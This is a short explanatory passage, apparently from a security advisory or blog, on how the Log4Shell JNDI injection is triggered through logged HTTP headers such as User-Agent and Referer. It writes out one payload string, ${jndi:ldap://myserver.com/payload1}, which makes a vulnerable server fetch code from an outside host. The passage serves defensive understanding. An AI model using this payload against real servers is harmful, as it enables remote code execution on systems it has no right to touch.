
For example, if the attack is on port 80 over http and the listener is a web server, the attacker knows the User-Agent string is usually logged by the server.
Therefore, they would set the User-Agent string in their http request to ${jndi:ldap://myserver.com/payload1}.
This is enough to trigger the vulnerability.
This is just an example.
Web servers log many headers, therefore one has to be careful not to focus on just User-Agent.
Referrer is another header that is typically logged as well as GET, X-Remote-IP, X-Forwarded-For, etc.